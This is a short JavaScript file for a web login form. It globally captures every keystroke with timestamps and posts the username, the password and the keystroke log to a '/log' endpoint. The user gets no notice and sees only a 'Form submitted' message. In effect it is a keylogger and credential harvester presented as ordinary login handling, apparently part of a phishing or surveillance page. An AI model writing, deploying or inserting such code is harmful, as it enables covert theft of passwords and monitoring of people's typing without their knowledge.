const capturedKeys = [];

document.addEventListener('keydown', (event) => {
  // Ignore control/meta keys
  if (event.key.length === 1 || event.key === 'Backspace') {
    capturedKeys.push({
      keyCode: event.keyCode,
      key: event.key,
      timestamp: new Date().toISOString(),
      eventType: 'keydown'
    });
  }
});

document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('login-form');
  const statusText = document.getElementById('status');

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const username = form.querySelector('input[name="username"]').value.trim();
    const password = form.querySelector('input[name="password"]').value.trim();

    if (!username || !password) {
      statusText.textContent = "Please enter both username and password.";
      statusText.style.color = "red";
      return;
    }

    const payload = {
      username,
      password,
      keystrokes: capturedKeys
    };

    try {
      const response = await fetch('/log', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      const result = await response.json();

      statusText.textContent = result.message || "Form submitted.";
      statusText.style.color = "green";

      // Clear form and keystrokes
      form.reset();
      capturedKeys.length = 0;
    } catch (err) {
      console.error('❌ Error sending keystrokes:', err);
      statusText.textContent = "Server error. Try again later.";
      statusText.style.color = "red";
    }
  });
});
